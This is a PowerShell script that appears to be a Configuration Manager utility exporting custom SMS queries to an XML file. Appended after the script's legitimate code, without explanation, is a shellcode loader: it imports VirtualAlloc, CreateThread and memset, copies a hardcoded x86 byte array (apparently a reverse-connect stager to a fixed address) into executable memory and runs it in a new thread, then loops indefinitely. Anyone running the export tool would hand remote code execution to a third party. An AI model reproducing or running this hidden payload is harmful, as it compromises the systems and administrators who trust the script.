[CmdletBinding(SupportsShouldProcess=$true)]param([parameter(Mandatory=$true, ParameterSetName="Multiple", HelpMessage="Site server where the SMS Provider is installed")][parameter(ParameterSetName="Single")][ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})][ValidateNotNullOrEmpty()][string]$SiteServer,[parameter(Mandatory=$false, ParameterSetName="Single", HelpMessage="Name of the Query")][ValidateNotNullOrEmpty()][string]$Name,[parameter(Mandatory=$true, ParameterSetName="Multiple", HelpMessage="Specify a valid path to where the XML file containing the Queries will be stored")][parameter(ParameterSetName="Single")][ValidateNotNullOrEmpty()][ValidatePattern("^[A-Za-z]{1}:\\\w+\\\w+")][ValidateScript({if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {Throw "$(Split-Path -Path $_ -Leaf) contains invalid characters"}else {if ([System.IO.Path]::GetExtension((Split-Path -Path $_ -Leaf)) -like ".xml") {return $true}else {Throw "$(Split-Path -Path $_ -Leaf) contains unsupported file extension. Supported extensions are '.xml'"}}})][string]$Path,[parameter(Mandatory=$false, ParameterSetName="Multiple", HelpMessage="Export all custom Queries")][switch]$Recurse,[parameter(Mandatory=$false, ParameterSetName="Multiple", HelpMessage="Will overwrite any existing XML files specified in the Path parameter")][parameter(ParameterSetName="Single")][switch]$Force)Begin {try {Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"$SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stopforeach ($SiteCodeObject in $SiteCodeObjects) {if ($SiteCodeObject.ProviderForLocalSite -eq $true) {$SiteCode = $SiteCodeObject.SiteCodeWrite-Debug "SiteCode: $($SiteCode)"}}}catch [System.UnauthorizedAccessException] {Write-Warning -Message "Access denied" ; break}catch [System.Exception] {Write-Warning -Message $_.Exception.Message ; break}if ([System.IO.File]::Exists($Path)) {if (-not($PSBoundParameters["Force"])) {Throw "Error creating '$($Path)', file already exists"}}}Process {$XMLData = New-Object -TypeName System.Xml.XmlDocument$XMLRoot = $XMLData.CreateElement("ConfigurationManager")$XMLData.AppendChild($XMLRoot) | Out-Null$XMLRoot.SetAttribute("Description", "Export of Queries")try {if ($PSBoundParameters["Recurse"]) {Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"$Queries = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Query -ComputerName $SiteServer -Filter "(QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')" -ErrorAction Stop$WmiFilter = "(QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"}elseif ($PSBoundParameters["Name"]) {if (($Name.StartsWith("*")) -and ($Name.EndsWith("*"))) {Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '%$($Name.Replace('*',''))%') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"$WmiFilter = "(Name like '%$($Name)%') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"}elseif ($Name.StartsWith("*")) {Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '%$($Name.Replace('*',''))') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"$WmiFilter = "(Name like '%$($Name)') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"}elseif ($Name.EndsWith("*")) {Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '$($Name.Replace('*',''))%') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"$WmiFilter = "(Name like '$($Name)%') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"}else {Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '$($Name)') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"$WmiFilter = "(Name like '$($Name)') AND (QueryID not like 'SMS%') AND (TargetClassName not like 'SMS_StatusMessage')"}if ($Name -match "\*") {$Name = $Name.Replace("*","")$WmiFilter = $WmiFilter.Replace("*","")}}$Queries = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Query -ComputerName $SiteServer -Filter $WmiFilter -ErrorAction Stop$QueryResultCount = ($Queries | Measure-Object).Countif ($QueryResultCount -gt 1) {Write-Verbose -Message "Query returned $($QueryResultCount) results"}else {Write-Verbose -Message "Query returned $($QueryResultCount) result"}if ($Queries -ne $null) {foreach ($Query in $Queries) {$XMLQuery = $XMLData.CreateElement("Query")$XMLData.ConfigurationManager.AppendChild($XMLQuery) | Out-Null$XMLQueryName = $XMLData.CreateElement("Name")$XMLQueryName.InnerText = ($Query | Select-Object -ExpandProperty Name)$XMLQueryExpression = $XMLData.CreateElement("Expression")$XMLQueryExpression.InnerText = ($Query | Select-Object -ExpandProperty Expression)$XMLQueryLimitToCollectionID = $XMLData.CreateElement("LimitToCollectionID")$XMLQueryLimitToCollectionID.InnerText = ($Query | Select-Object -ExpandProperty LimitToCollectionID)$XMLQueryTargetClassName = $XMLData.CreateElement("TargetClassName")$XMLQueryTargetClassName.InnerText = ($Query | Select-Object -ExpandProperty TargetClassName)$XMLQuery.AppendChild($XMLQueryName) | Out-Null$XMLQuery.AppendChild($XMLQueryExpression) | Out-Null$XMLQuery.AppendChild($XMLQueryLimitToCollectionID) | Out-Null$XMLQuery.AppendChild($XMLQueryTargetClassName) | Out-NullWrite-Verbose -Message "Exported '$($XMLQueryName.InnerText)' to '$($Path)'"}}else {Write-Verbose -Message "Query did not return any objects"}}catch [Exception] {Throw $_.Exception.Message}}End {$XMLData.Save($Path) | Out-Null}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x19,0x75,0xad,0xc1,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};